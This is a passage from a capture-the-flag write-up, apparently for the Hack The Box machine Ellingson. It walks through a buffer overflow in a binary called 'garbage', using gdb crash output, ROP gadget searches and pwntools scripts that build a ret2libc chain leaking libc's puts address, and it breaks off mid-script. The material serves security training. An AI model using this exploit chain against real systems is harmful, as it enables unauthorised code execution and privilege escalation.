&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;margo@ellingson:~$ /usr/bin/garbage&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password: test&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;margo@ellingson:~$ /usr/bin/garbage&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password: qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;Segmentation fault (core dumped)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let's copy the binary on our machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;scp margo@10.10.10.139:/usr/bin/garbage ./&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We check the flags of the binary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# gdb ./garbage&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;gdb-peda$ checksec&lt;/span&gt;
&lt;span class="code-line"&gt;CANARY    : disabled&lt;/span&gt;
&lt;span class="code-line"&gt;FORTIFY   : disabled&lt;/span&gt;
&lt;span class="code-line"&gt;NX        : ENABLED&lt;/span&gt;
&lt;span class="code-line"&gt;PIE       : disabled&lt;/span&gt;
&lt;span class="code-line"&gt;RELRO     : Partial&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The No-Execute bit is set. Therefore we need to use a ret2lib.&lt;/p&gt;
&lt;p&gt;The ASLR is activated on the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space&lt;/span&gt;
&lt;span class="code-line"&gt;2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As ASLR is on and the NX bit (no-execute) is set we will also need the box libc
to do a ROP:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="analysing-the-buffer-overflow"&gt;Analysing the Buffer Overflow&lt;/h2&gt;
&lt;p&gt;&lt;a href="/media/2019.10/ellingson_garbage"&gt;&lt;em&gt;The binary is avalible here&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We load the binary in gdb &lt;a href="https://github.com/longld/peda"&gt;peda&lt;/a&gt; and search for
the size of the buffer.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gdb-peda$ r &amp;lt; &amp;lt;(python -c &amp;#39;print &amp;quot;A&amp;quot;*133+&amp;quot;B&amp;quot;+&amp;quot;C&amp;quot;+&amp;quot;D&amp;quot;+&amp;quot;E&amp;quot;+&amp;quot;F&amp;quot;+&amp;quot;G&amp;quot;+&amp;quot;H&amp;quot;+&amp;quot;J&amp;quot;&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;Starting program: /root/garbage &amp;lt; &amp;lt;(python -c &amp;#39;print &amp;quot;A&amp;quot;*133+&amp;quot;B&amp;quot;+&amp;quot;C&amp;quot;+&amp;quot;D&amp;quot;+&amp;quot;E&amp;quot;+&amp;quot;F&amp;quot;+&amp;quot;G&amp;quot;+&amp;quot;H&amp;quot;+&amp;quot;J&amp;quot;&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password:&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Program received signal SIGSEGV, Segmentation fault.&lt;/span&gt;
&lt;span class="code-line"&gt;[----------------------------------registers-----------------------------------]&lt;/span&gt;
&lt;span class="code-line"&gt;RAX: 0x0&lt;/span&gt;
&lt;span class="code-line"&gt;RBX: 0x0&lt;/span&gt;
&lt;span class="code-line"&gt;RCX: 0x7f1a0b24ead4 (&amp;lt;__GI___libc_write+20&amp;gt;:    cmp    rax,0xfffffffffffff000)&lt;/span&gt;
&lt;span class="code-line"&gt;RDX: 0x7f1a0b31f580 --&amp;gt; 0x0&lt;/span&gt;
&lt;span class="code-line"&gt;RSI: 0x12a0ba0 (&amp;quot;access denied.\nssword: \n\220\v*\001&amp;quot;)&lt;/span&gt;
&lt;span class="code-line"&gt;RDI: 0x0&lt;/span&gt;
&lt;span class="code-line"&gt;RBP: 0x4443424141414141 (&amp;#39;AAAAABCD&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;RSP: 0x7ffedbba9290 --&amp;gt; 0x7ffedbba9380 --&amp;gt; 0x1&lt;/span&gt;
&lt;span class="code-line"&gt;RIP: 0x4a48474645 (&amp;#39;EFGHJ&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;R8 : 0xf&lt;/span&gt;
&lt;span class="code-line"&gt;R9 : 0x7f1a0b31d848 --&amp;gt; 0x7f1a0b31d760 --&amp;gt; 0xfbad2a84&lt;/span&gt;
&lt;span class="code-line"&gt;R10: 0x4005a5 --&amp;gt; 0x7475700073747570 (&amp;#39;puts&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;R11: 0x246&lt;/span&gt;
&lt;span class="code-line"&gt;R12: 0x401170 (&amp;lt;_start&amp;gt;:    xor    ebp,ebp)&lt;/span&gt;
&lt;span class="code-line"&gt;R13: 0x7ffedbba9380 --&amp;gt; 0x1&lt;/span&gt;
&lt;span class="code-line"&gt;R14: 0x0&lt;/span&gt;
&lt;span class="code-line"&gt;R15: 0x0&lt;/span&gt;
&lt;span class="code-line"&gt;EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction&lt;/span&gt;
&lt;span class="code-line"&gt;overflow)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The buffer size is 136 (133+3). We could also use the peda's functions
&lt;code&gt;pattern_create&lt;/code&gt; and &lt;code&gt;pattern_offset&lt;/code&gt; to find it. Then we can start to write our exploitation
script using &lt;a href="http://pwntools.com"&gt;pwntools&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./garbage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DEBUG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;junk&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;136&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Enter access password: 123456&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We want to get the dynamic address of &lt;code&gt;LIBC&lt;/code&gt; in order to be able to call a
specific function (let's say &lt;code&gt;/bin/sh&lt;/code&gt;). For that we need:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;to find a &lt;code&gt;pop rdi&lt;/code&gt; call. We use &lt;a href="https://github.com/sashs/Ropper"&gt;ropper&lt;/a&gt; for that:&lt;/p&gt;
&lt;p&gt;:::text
root@kalili:~# ropper --file ./garbage --search 'pop rdi'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi&lt;/p&gt;
&lt;p&gt;[INFO] File: ./garbage
0x000000000040179b: pop rdi; ret;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;two informations about the &lt;a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html"&gt;PLT and GOT&lt;/a&gt; &lt;code&gt;puts&lt;/code&gt; callsinto &lt;code&gt;LIBC&lt;/code&gt;.  For that we can grep the &lt;code&gt;objdump&lt;/code&gt; output:&lt;/p&gt;
&lt;p&gt;:::text
objdump -D garbage | grep puts
0000000000401050 &lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#112;&amp;#117;&amp;#116;&amp;#115;&amp;#64;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#112;&amp;#117;&amp;#116;&amp;#115;&amp;#64;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:
401050: ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 &lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#112;&amp;#117;&amp;#116;&amp;#115;&amp;#64;&amp;#71;&amp;#76;&amp;#73;&amp;#66;&amp;#67;&amp;#95;&amp;#50;&amp;#46;&amp;#50;&amp;#46;&amp;#53;"&gt;&amp;#112;&amp;#117;&amp;#116;&amp;#115;&amp;#64;&amp;#71;&amp;#76;&amp;#73;&amp;#66;&amp;#67;&amp;#95;&amp;#50;&amp;#46;&amp;#50;&amp;#46;&amp;#53;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We add this addresses to our exploit and output the &lt;code&gt;puts&lt;/code&gt; address in &lt;code&gt;LIBC&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./garbage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DEBUG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;plt_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x401050&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;got_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x404028&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x40179b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;junk&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;136&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pop_rdi&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;got_put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;plt_put&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Enter access password: 123456&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Leaked address printed in a readable format&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ljust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;success&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Leaked puts@GLIBC: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here is the output of it (for sanity I commented the debugging option):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# python exploitP.py&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Starting local process &amp;#39;./garbage&amp;#39;: pid 1407&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Leaked puts@GLIBC: @ T�Z\x7f\x00\x00&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Stopped process &amp;#39;./garbage&amp;#39; (pid 1407)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# python exploitP.py&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Starting local process &amp;#39;./garbage&amp;#39;: pid 1411&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Leaked puts@GLIBC: @pYBs\x7f\x00\x00&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Stopped process &amp;#39;./garbage&amp;#39; (pid 1411)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# python exploitP.py&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Starting local process &amp;#39;./garbage&amp;#39;: pid 1415&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Leaked puts@GLIBC: @0X\x0en\x7f\x00\x00&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Stopped process &amp;#39;./garbage&amp;#39; (pid 1415)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got the leaked address of the &lt;code&gt;puts&lt;/code&gt; call in LIBC.
As the ASLR is on, multiple runs give us different addresses for the &lt;code&gt;puts&lt;/code&gt; call
in LIBC. But our process logically stop. If we rerun it the address will be
different. Therefore we need to recall our main. We get the address using
&lt;code&gt;objdump&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;objdump -D garbage | grep main&lt;/span&gt;
&lt;span class="code-line"&gt;  401194:   ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 &amp;lt;__libc_start_main@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;0000000000401619 &amp;lt;main&amp;gt;:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we add it to our script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./garbage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DEBUG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;plt_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x401050&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;got_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x404028&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x40179b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;plt_main&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x401619&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;junk&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;136&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pop_rdi&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;got_put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;plt_put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;plt_main&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Enter access password: 123456&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Leaked address printed in a readable format&lt;/span&gt;&lt;/span&gt;
